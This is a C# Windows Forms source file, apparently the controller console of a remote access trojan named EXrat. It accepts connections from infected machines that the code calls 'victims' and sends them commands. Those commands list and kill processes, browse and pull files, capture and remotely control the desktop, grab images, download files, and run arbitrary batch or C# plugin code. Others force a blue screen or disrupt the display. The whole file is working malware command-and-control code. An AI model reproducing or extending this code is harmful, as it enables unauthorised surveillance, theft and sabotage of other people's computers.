using BrightIdeasSoftware;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace EXrat_Controller
{
    public partial class Form1 : Form
    {

        public static bool Is_MouseDraw_Enabled = false;

        private const float Device_Space_Percent = 8.2f;
        private const float Username_Space_Percent = 15.7f;
        private const float IP_Space_Percent = 18.8f;
        private const float Screen_Width_Space_Percent = 19.4f;
        private const float Screen_Height_Space_Percent = 19.4f;
        private const float Is_Admin_Space_Percent = 18.5f;

        public static string Savelocation = "Notset.txt";
        public static List<Socket> connections = new List<Socket>();
        private static readonly string IPAdress = GetIP();
        private static string LastSelectedIP = "";

        private readonly TcpListener Server = new TcpListener(IPAddress.Parse(IPAdress), 5000);

        private readonly List<Thread> PingThreads = new List<Thread>();
        private readonly List<NetworkStream> ServerStreams = new List<NetworkStream>();
        private readonly List<BinaryReader> BR = new List<BinaryReader>();
        public static List<BinaryWriter> BW = new List<BinaryWriter>();
        private int DevicesConnectedCount = 0;
        private readonly Form f2 = new Form2();
        private readonly Form3 f3 = new Form3();
        private readonly Form4 f4 = new Form4();
        public static TcpListener FileTcpL = new TcpListener(IPAddress.Parse(IPAdress), 5001);


        public static TcpListener GetDesktopTcpL = new TcpListener(IPAddress.Parse(IPAdress), 5002);
        public static TcpListener GetBTSTcpL = new TcpListener(IPAddress.Parse(GetIP()), 5003);
        public static ObjectListView OLV;
        public Form1()
        {

            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            int targetPos = contextMenuStrip1.Items.Count;

            OLV = objectListView1;
            if (Directory.GetFiles("Plugins", "*.CSP").Length + Directory.GetFiles("Plugins", "*.BAP").Length != 0)
            {

                foreach (FileInfo F in new DirectoryInfo(@"Plugins").GetFiles("*.CSP"))
                {
                    ToolStripItem item = contextMenuStrip1.Items.Add(Path.GetFileNameWithoutExtension(F.FullName));

                    contextMenuStrip1.Items.Add(item);
                    item.Click += delegate (object Osender, EventArgs ea)
                    {
                        string PluginText = File.ReadAllText(F.FullName);
                        string[] Groups = File.ReadAllText(F.FullName).Split(new string[] { "{~<", ">~}" }, StringSplitOptions.RemoveEmptyEntries);

                        List<string> GroupsFixed = new List<string>();

                        Groups = Groups.Where(s => !string.IsNullOrWhiteSpace(s)).ToArray();
                        for (int i = 0; i != 3; i++)
                        {
                            GroupsFixed.Add(Groups[i]);
                        }

                        GroupsFixed.Add(PluginText.Split(new string[] { Groups[2] }, StringSplitOptions.RemoveEmptyEntries)[1]);
                        GroupsFixed[3] = GroupsFixed[3].Remove(0, 2);
                        string ReferencedAssemblies = GroupsFixed[1].Replace("\" \"", "&").Replace("\"", "");


                        if (GroupsFixed[2] == "null")
                        {
                        }
                        else
                        {
                            List<string> labelsVaribles = GroupsFixed[2].Split('"').Where(s => !string.IsNullOrWhiteSpace(s)).ToList();
                            List<string> LabelList = new List<string>();
                            List<string> VariableList = new List<string>();
                            foreach (string labelvariable in labelsVaribles) { LabelList.Add(labelvariable.Split(':').Last()); VariableList.Add(labelvariable.Split(':').First()); }

                        }

                    };
                }

                foreach (FileInfo F in new DirectoryInfo(@"Plugins").GetFiles("*.BAP"))
                {
                    ToolStripItem item = contextMenuStrip1.Items.Add(Path.GetFileNameWithoutExtension(F.FullName));

                    contextMenuStrip1.Items.Add(item);
                    item.Click += delegate (object Osender, EventArgs ea)
                    {
                        string PluginText = File.ReadAllText(F.FullName);
                        List<string> Groups = File.ReadAllText(F.FullName).Split(new string[] { "{~<", ">~}" }, StringSplitOptions.RemoveEmptyEntries).ToList();

                        if (Groups[0] == "null")
                        {
                        }
                        else
                        {
                            List<string> labelsVaribles = Groups[0].Split('"').Where(s => !string.IsNullOrWhiteSpace(s)).ToList();
                            List<string> LabelList = new List<string>();
                            List<string> VariableList = new List<string>();
                            foreach (string labelvariable in labelsVaribles) { LabelList.Add(labelvariable.Split(':').Last()); VariableList.Add(labelvariable.Split(':').First()); }
                            foreach (string labelvariable in labelsVaribles) { LabelList.Add(labelvariable.Split(':').Last()); VariableList.Add(labelvariable.Split(':').First()); }
                            foreach (string labelvariable in labelsVaribles) { LabelList.Add(labelvariable.Split(':').Last()); VariableList.Add(labelvariable.Split(':').First()); }

                            GenerateFormRUNBAT(LabelList, VariableList, Path.GetFileNameWithoutExtension(F.FullName), Groups[1], objectListView1.SelectedObjects).Show();
                        }

                    };
                }

            }
            string Spaces = new string(' ', (contextMenuStrip1.Width - TextRenderer.MeasureText("--- Plugins ---", contextMenuStrip1.Font).Width) / TextRenderer.MeasureText(" ", contextMenuStrip1.Font).Width);

            contextMenuStrip1.Items.Insert(targetPos, new ToolStripLabel(" "));
            contextMenuStrip1.Items.Insert(targetPos + 1, new ToolStripLabel(Spaces + "--- Plugins ---" + Spaces));
            Server.Start();
            Thread AcceptConnectionTHREAD = new Thread(new ThreadStart(AcceptConnections))
            {
                IsBackground = true
            };
            AcceptConnectionTHREAD.Start();


            FileTcpL.Start();
            GetDesktopTcpL.Start();
            GetBTSTcpL.Start();

            menuStrip1.BackColor = Color.FromArgb(148, 148, 148);
            victim.InitOLV(objectListView1, Device, Username, Properties.Resources.Icon);
            objectListView1.ContextMenuStrip = contextMenuStrip1;


        }

        private void GenerateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            f2.Show();
        }

        private void ObjectListView1_SizeChanged(object sender, EventArgs e)
        {
            Device.Width = (int)(Device_Space_Percent / 100 * objectListView1.Width);
            Username.Width = (int)(Username_Space_Percent / 100 * objectListView1.Width);
            IP.Width = (int)(IP_Space_Percent / 100 * objectListView1.Width);
            Screen_Width.Width = (int)(Screen_Width_Space_Percent / 100 * objectListView1.Width);
            Screen_Height.Width = (int)(Screen_Height_Space_Percent / 100 * objectListView1.Width);
            Is_Admin.Width = (int)(Is_Admin_Space_Percent / 100 * objectListView1.Width);
        }
        private static int CountArguments(string input)
        {
            return input.Count(c => c == '"') / 2;
        }

        public void GetMessages(BinaryReader BinaryR, int index)
        {

            while (true)
            {
                if (DevicesConnectedCount != 0)
                {
                    try
                    {
                        string Reply = "";
                        Thread ReplyGetThread = new Thread(new ThreadStart(() => { Reply = RecieveMessage(BinaryR); }));
                        ReplyGetThread.Start();
                        bool success = ReplyGetThread.Join(30 * 1000);
                        if (!success || Reply == "ERROR_CloseThread")
                        {
                            ServerStreams[index].Close();
                            ServerStreams.RemoveAt(index);
                            BR[index].Close();
                            BR.RemoveAt(index);
                            BW[index].Close();
                            BW.RemoveAt(index);

                            PingThreads[index].Abort();
                            return;
                        }



                        if (Reply.First() == '!')
                        {

                            if (GetCommand(Reply).ToLower() == "pong")
                            {
                                victim.Add(new victim(GetArgument(Reply, ' ', 1), GetArgument(Reply, ' ', 2), GetArgument(Reply, ' ', 3), GetArgument(Reply, ' ', 4), GetArgument(Reply, ' ', 5)));
                                Console.WriteLine(GetArgument(Reply, ' ', 2) + ":" + LastSelectedIP + ":" + objectListView1.Items.Count);
                                if (GetArgument(Reply, ' ', 2) == LastSelectedIP)
                                {
                                    Invoke((MethodInvoker)delegate ()
                                    {
                                        objectListView1.SelectedIndex = objectListView1.Items.Count - 1;
                                    });

                                }
                                DevicesConnectedCount++;
                            }
                            if (GetCommand(Reply).ToLower() == "pl")
                            {
                                Invoke((MethodInvoker)delegate ()
                                {
                                    Form ProcesslistForm = ProcessListGenerator(Reply, objectListView1.SelectedObjects);
                                    ProcesslistForm.Show();
                                });

                            }
                            if (GetCommand(Reply).ToLower() == "dl")
                            {
                                Invoke((MethodInvoker)delegate ()
                                {
                                    f3.Target = ((victim)objectListView1.SelectedObjects[0]).IP;
                                    f3.InitForm3();
                                    f3.listView1.Items.Clear();
                                    f3.ItemsFromCommand(Reply);
                                    f3.Show();

                                });
                            }

                            if (GetCommand(Reply).ToLower() == "tr")
                            {

                                Invoke((MethodInvoker)delegate ()
                                {
                                    f3.listView1.Items.Clear();
                                    f3.ItemsFromCommand(Reply);
                                });
                            }
                            if (GetCommand(Reply).ToLower() == "sf")
                            {
                                byte[] data = new byte[2048];
                                using (TcpClient GetFileClient = FileTcpL.AcceptTcpClient())
                                {
                                    using (NetworkStream FileNS = GetFileClient.GetStream())
                                    {

                                        using (FileStream fs = File.Create(Savelocation))
                                        {
                                            int ByteCount;

                                            while (true)
                                            {
                                                ByteCount = FileNS.Read(data, 0, data.Length);
                                                fs.Write(data, 0, ByteCount);
                                                if (ByteCount < 2048)
                                                {
                                                    break;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            if (GetCommand(Reply).ToLower() == "di")
                            {
                                byte[] data = new byte[1024];

                                MemoryStream DesktopMS = new MemoryStream();

                                using (TcpClient GetDesktopClient = GetDesktopTcpL.AcceptTcpClient())
                                {

                                    using (NetworkStream GetDesktopNS = GetDesktopClient.GetStream())
                                    {

                                        int ByteCount;

                                        while (true)
                                        {
                                            ByteCount = GetDesktopNS.Read(data, 0, data.Length);
                                            DesktopMS.Write(data, 0, ByteCount);
                                            if (ByteCount < 1024)
                                            {
                                                break;
                                            }
                                        }

                                    }
                                }

                                f4.BackgroundImage = Image.FromStream(DesktopMS);
                            }

                            if (GetCommand(Reply).ToLower() == "cs")
                            {

                                byte[] data = new byte[1024];

                                MemoryStream BTSMS = new MemoryStream();

                                using (TcpClient BTSClient = GetBTSTcpL.AcceptTcpClient())
                                {

                                    using (NetworkStream BTSNS = BTSClient.GetStream())
                                    {

                                        int ByteCount;

                                        while (true)
                                        {
                                            ByteCount = BTSNS.Read(data, 0, data.Length);
                                            BTSMS.Write(data, 0, ByteCount);
                                            if (ByteCount < 1024)
                                            {
                                                break;
                                            }

                                        }


                                    }
                                }
                                Image Picture = Image.FromStream(BTSMS);
                                f4.PictureBoxImage = Picture;

                            }
                            if (GetCommand(Reply).ToLower() == "ad")
                            {
                                MessageBox.Show("Access is denied");
                            }

                            if (GetCommand(Reply).ToLower() == "fail")
                            {
                                MessageBox.Show("Action failed to excute!");
                            }
                        }
                    }
                    catch (Exception)
                    {

                    }

                }
                Thread.Sleep(250);
            }
        }

        public string RecieveMessage(BinaryReader binaryReader)
        {
            try
            {
                return binaryReader.ReadString();
            }
            catch
            {
                return "ERROR_CloseThread";
            }
        }
        public void AcceptConnections()
        {
            while (true)
            {
                connections.Add(Server.AcceptSocket());
                DevicesConnectedCount++;
                ServerStreams.Add(new NetworkStream(connections.Last()));
                BR.Add(new BinaryReader(ServerStreams.Last()));
                BW.Add(new BinaryWriter(ServerStreams.Last()));

                PingThreads.Add(new Thread(() => Ping(BW.Last()))
                {
                    IsBackground = true,
                    Priority = ThreadPriority.Lowest
                });
                PingThreads.Last().Start();


                Thread GetMessagesTHREAD = new Thread(() => GetMessages(BR.Last(), BR.Count - 1))
                {
                    IsBackground = true
                };

                GetMessagesTHREAD.Start();
            }
        }

        public void Ping(BinaryWriter BW)
        {
            while (true)
            {

                try
                {
                    BW.Write("!ping ");
                }
                catch
                {

                }
                objectListView1.ClearObjects();
                Thread.Sleep(5000);
            }
        }

        private static string GetCommand(string text)
        {
            try
            {
                return text.Split('!', ' ')[1].ToLower();
            }
            catch (Exception) { return ""; }
        }
        private static string GetArgument(string text, char between, int number)
        {
            try
            {
                return text.Split(between).Skip((2 * number) - 1).First();
            }
            catch (Exception)
            {
                return "";
            }
        }
        public static string GetIP()
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
            {
                socket.Connect("8.8.4.4", 5000);
                return ((IPEndPoint)socket.LocalEndPoint).Address.ToString();
            }
        }
        public static Form ProcessListGenerator(string Proclist, IList SelectedObjects)
        {

            Form GeneratedForm = new Form();

            ListView LV = new ListView();
            GeneratedForm.Size = new Size(545, 600);
            LV.Dock = DockStyle.Fill;
            LV.Location = new Point(0, 0);
            LV.FullRowSelect = true;
            LV.View = View.Details;


            ContextMenuStrip CMS = new ContextMenuStrip();
            ToolStripItem Kill = CMS.Items.Add("Kill");

            Kill.Click += delegate (object sender, EventArgs e)
            {
                CommandSender("!kill", SelectedObjects, LV.SelectedItems[0].SubItems[2].Text);
                LV.Items.Remove(LV.SelectedItems[0]);
            };
            LV.ContextMenuStrip = CMS;

            ColumnHeader Title = new ColumnHeader("Title")
            {
                Text = "Title",
                Width = 300
            };

            ColumnHeader Name = new ColumnHeader("Name")
            {
                Text = "Name",
                Width = 150
            };

            ColumnHeader ID = new ColumnHeader("ID")
            {
                Text = "ID",
                Width = 75
            };

            LV.Columns.AddRange(new ColumnHeader[] { Title, Name, ID });


            foreach (string s in Proclist.Split(new char[] { '(', ')' }).Where(s => !string.IsNullOrWhiteSpace(s)).Skip(1))
            {

                LV.Items.Add(new ListViewItem(new string[] { GetArgument(s, '"', 1), GetArgument(s, '"', 2), GetArgument(s, '"', 3) }));
            }

            GeneratedForm.Controls.Add(LV);
            return GeneratedForm;
        }
        public static Form GenerateForm(List<string> labels, string title, string BaseCommand, IList SelectedObjects)
        {
            Form GeneratedForm = new Form
            {
                FormBorderStyle = FormBorderStyle.FixedSingle,
                Size = new Size(400, 75 + (labels.Count() * 40)),
                Text = title
            };
            Label TitleLabel = new Label
            {
                Font = new Font("arial", 10, FontStyle.Bold)
            };
            TitleLabel.Location = new Point((GeneratedForm.Size.Width / 2) - (TextRenderer.MeasureText(title, TitleLabel.Font).Width / 2), 0);
            TitleLabel.Text = title;
            GeneratedForm.Controls.Add(TitleLabel);

            int CurrentY = 0;
            List<TextBox> GeneratedTextboxes = new List<TextBox>();
            foreach (string label in labels)
            {
                Label GeneratedLabel = new Label();
                TextBox GeneratedtextBox = new TextBox();

                CurrentY = CurrentY + 25;
                GeneratedLabel.Text = label;
                GeneratedLabel.Location = new Point(0, CurrentY);

                GeneratedtextBox.Location = new Point(GeneratedLabel.Width, CurrentY);
                GeneratedTextboxes.Add(GeneratedtextBox);
                GeneratedForm.Controls.Add(GeneratedLabel);
            }
            foreach (TextBox TB in GeneratedTextboxes)
            {
                GeneratedForm.Controls.Add(TB);
            }
            Button Send = new Button
            {
                Text = "Send"
            };

            Send.Location = new Point(GeneratedForm.Bounds.Right - Send.Width - 20, GeneratedForm.Height - Send.Height - 45);
            GeneratedForm.Controls.Add(Send);


            Send.Click += delegate (object sender, EventArgs args)
            {
                List<string> Arguments = new List<string>();
                foreach (TextBox generatedtextbox in GeneratedTextboxes)
                {
                    Arguments.Add(generatedtextbox.Text);
                }
                CommandSender(BaseCommand, SelectedObjects, Arguments.ToArray());

            };
            return GeneratedForm;
        }

        public static Form GenerateFormRUNCS(List<string> labels, List<string> ReplacementList, string title, string Source, string ReferencedAssemblies, string NCMgroup, IList SelectedObjects)
        {

            Form GeneratedForm = new Form
            {
                FormBorderStyle = FormBorderStyle.FixedSingle,
                Size = new Size(400, 75 + (labels.Count() * 40)),
                Text = title
            };
            Label TitleLabel = new Label
            {
                Font = new Font("arial", 10, FontStyle.Bold)
            };
            TitleLabel.Location = new Point((GeneratedForm.Size.Width / 2) - (TextRenderer.MeasureText(title, TitleLabel.Font).Width / 2), 0);
            TitleLabel.Text = title;
            GeneratedForm.Controls.Add(TitleLabel);

            int CurrentY = 0;
            List<TextBox> GeneratedTextboxes = new List<TextBox>();
            foreach (string label in labels)
            {
                Label GeneratedLabel = new Label();
                TextBox GeneratedtextBox = new TextBox();

                CurrentY = CurrentY + 25;
                GeneratedLabel.Text = label;
                GeneratedLabel.Location = new Point(0, CurrentY);

                GeneratedtextBox.Location = new Point(GeneratedLabel.Width, CurrentY);
                GeneratedTextboxes.Add(GeneratedtextBox);
                GeneratedForm.Controls.Add(GeneratedLabel);
            }
            foreach (TextBox TB in GeneratedTextboxes)
            {
                GeneratedForm.Controls.Add(TB);
            }
            Button Send = new Button
            {
                Text = "Send"
            };

            Send.Location = new Point(GeneratedForm.Bounds.Right - Send.Width - 20, GeneratedForm.Height - Send.Height - 45);
            GeneratedForm.Controls.Add(Send);


            Send.Click += delegate (object sender, EventArgs args)
            {
                string sourceReplaced = Source;
                for (int i = 0; i != GeneratedTextboxes.Count; i++)
                {
                    sourceReplaced = sourceReplaced.Replace(ReplacementList[i], "\"" + GeneratedTextboxes[i].Text + "\"");
                }

                RunCMDsender("!runcs", SelectedObjects, sourceReplaced.Remove(0, 1), ReferencedAssemblies, GetArgument(NCMgroup, '"', 1), GetArgument(NCMgroup, '"', 2), GetArgument(NCMgroup, '"', 3));


            };
            return GeneratedForm;
        }

        public static Form GenerateFormRUNBAT(List<string> labels, List<string> ReplacementList, string title, string Source, IList SelectedObjects)
        {

            Form GeneratedForm = new Form
            {
                FormBorderStyle = FormBorderStyle.FixedSingle,
                Size = new Size(400, 75 + (labels.Count() * 40)),
                Text = title
            };
            Label TitleLabel = new Label
            {
                Font = new Font("arial", 10, FontStyle.Bold)
            };
            TitleLabel.Location = new Point((GeneratedForm.Size.Width / 2) - (TextRenderer.MeasureText(title, TitleLabel.Font).Width / 2), 0);
            TitleLabel.Text = title;
            GeneratedForm.Controls.Add(TitleLabel);

            int CurrentY = 0;
            List<TextBox> GeneratedTextboxes = new List<TextBox>();
            foreach (string label in labels)
            {
                Label GeneratedLabel = new Label();
                TextBox GeneratedtextBox = new TextBox();

                CurrentY = CurrentY + 25;
                GeneratedLabel.Text = label;
                GeneratedLabel.Location = new Point(0, CurrentY);

                GeneratedtextBox.Location = new Point(GeneratedLabel.Width, CurrentY);
                GeneratedTextboxes.Add(GeneratedtextBox);
                GeneratedForm.Controls.Add(GeneratedLabel);
            }
            foreach (TextBox TB in GeneratedTextboxes)
            {
                GeneratedForm.Controls.Add(TB);
            }
            Button Send = new Button
            {
                Text = "Send"
            };

            Send.Location = new Point(GeneratedForm.Bounds.Right - Send.Width - 20, GeneratedForm.Height - Send.Height - 45);
            GeneratedForm.Controls.Add(Send);


            Send.Click += delegate (object sender, EventArgs args)
            {
                string sourceReplaced = Source;
                for (int i = 0; i != GeneratedTextboxes.Count; i++)
                {
                    sourceReplaced = sourceReplaced.Replace(ReplacementList[i], GeneratedTextboxes[i].Text);
                }

                CommandSender("!RunBatch", SelectedObjects, sourceReplaced.Remove(0, 3));


            };
            return GeneratedForm;
        }
        public static void CommandSender(string Command, IList SelectedObjects)
        {
            try
            {
                if (SelectedObjects.Count != 0)
                {
                    foreach (victim v in SelectedObjects)
                    {
                        SocketToBW(connections, v.IP).Write(Command + " " + "\"" + v.IP + "\"");
                    }
                }
                else
                {
                    foreach (BinaryWriter B in BW)
                    {
                        B.Write(Command + " " + "\"All\"");
                    }

                }
            }
            catch (Exception)
            {
                MessageBox.Show("Error!");
            }
        }
        public static void CommandSender(string Command, IList SelectedObjects, params string[] arguments)
        {

            string Arguments = "";
            try
            {
                foreach (string argument in arguments)
                {
                    Arguments = Arguments + "\"" + argument + "\" ";
                }
                if (SelectedObjects.Count != 0)
                {
                    foreach (victim v in SelectedObjects)
                    {
                        SocketToBW(connections, v.IP).Write(Command + " " + "\"" + v.IP + "\" " + Arguments);
                    }
                }
                else
                {
                    foreach (BinaryWriter B in BW)
                    {
                        B.Write(Command + " " + "\"All\" " + Arguments);
                    }
                }
            }
            catch (Exception)
            {
                MessageBox.Show("Error!");
            }
        }
        public static void RunCMDsender(string Command, IList SelectedObjects, params string[] arguments)
        {
            try
            {
                string Arguments = "";
                foreach (string argument in arguments)
                {
                    Arguments = Arguments + "*~i!@" + argument + "@!i~*";
                }

                if (SelectedObjects.Count != 0)
                {
                    foreach (victim v in SelectedObjects)
                    {
                        SocketToBW(connections, v.IP).Write(Command + " " + "\"" + v.IP + "\" " + Arguments);
                    }
                }
                else
                {
                    foreach (BinaryWriter B in BW)
                    {
                        B.Write(Command + " " + "\"All\" " + Arguments);
                    }
                }
            }
            catch (Exception)
            {
                MessageBox.Show("Error!");
            }
        }

        public static BinaryWriter SocketToBW(List<Socket> Connections, string IP)
        {
            return BW[connections.IndexOf(connections.Where(S => ((IPEndPoint)S.RemoteEndPoint).Address.ToString().Equals(IP)).Last())];
        }
        private void TextToVoiceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GenerateForm(new List<string>() { "Message: " }, "Text To Speech", "!say", objectListView1.SelectedObjects).Show();
        }

        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GenerateForm(new List<string>() { "Message: " }, "MessageBox", "!messagebox", objectListView1.SelectedObjects).Show();
        }

        private void setWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GenerateForm(new List<string>() { "Wallpaper: " }, "Set wallpaper", "!setwallpaper", objectListView1.SelectedObjects).Show();
        }

        private void blackoutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!blackout", objectListView1.SelectedObjects);
        }

        private void backlightOffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!backlightoff", objectListView1.SelectedObjects);
        }

        private void mouseDrawToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Is_MouseDraw_Enabled == false)
            {
                GenerateForm(new List<string>() { "Image: " }, "Mouse Draw", "!mousedraw", objectListView1.SelectedObjects).Show();
            }
            else
            {
                CommandSender("!mousedraw", objectListView1.SelectedObjects);
            }
        }

        private void setAllTextToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GenerateForm(new List<string>() { "Text: " }, "Set all text", "!settext", objectListView1.SelectedObjects).Show();
        }

        private void reverseTextToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!reversetext", objectListView1.SelectedObjects);
        }

        private void invertColorsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!invertcolors", objectListView1.SelectedObjects);
        }

        private void invertColorsHeadacheToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!headache", objectListView1.SelectedObjects);
        }

        private void drawTextToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GenerateForm(new List<string>() { "Text: ", "Time(Milliseconds): " }, "draw text", "!drawstring", objectListView1.SelectedObjects).Show();
        }

        private void downloadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GenerateForm(new List<string>() { "Link: ", "Path: " }, "Download file", "!downloadfile", objectListView1.SelectedObjects).Show();
        }

        private void processlistToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!proclist", objectListView1.SelectedObjects);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {

                foreach (victim v in objectListView1.SelectedObjects)
                {
                    SocketToBW(connections, v.IP).Write("!restart ");
                }
            }
            catch { }

        }

        private void withoutSizeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GenerateForm(new List<string>() { "Link: " }, "Draw Image", "!draw", objectListView1.SelectedObjects).Show();
        }

        private void withSizeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GenerateForm(new List<string>() { "Link: ", "Width: ", "Height: " }, "Draw Image", "!draw", objectListView1.SelectedObjects).Show();
        }

        private void filesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!drives", objectListView1.SelectedObjects);
        }

        private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!bsod", objectListView1.SelectedObjects);
        }

        private void controlToolStripMenuItem_Click(object sender, EventArgs e)
        {

            CommandSender("!showdesktop", objectListView1.SelectedObjects);
            f4.Target_Sheight = Convert.ToInt32(((victim)objectListView1.SelectedObjects[0]).ScreenHeight);
            f4.Target_Swidth = Convert.ToInt32(((victim)objectListView1.SelectedObjects[0]).ScreenWidth);
            f4.Target_IP = ((victim)objectListView1.SelectedObjects[0]).IP;
            f4.Show();

        }

        private void openCDTrayToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!otray", objectListView1.SelectedObjects);
        }

        private void closeCDTrayToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!ctray", objectListView1.SelectedObjects);
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!restart", objectListView1.SelectedObjects);
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CommandSender("!remove", objectListView1.SelectedObjects);
        }

        private void objectListView1_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            try
            {
                if (e.IsSelected)
                {
                    LastSelectedIP = ((victim)objectListView1.SelectedObjects[e.ItemIndex]).IP;
                }
            }
            catch { }
        }
    }
}
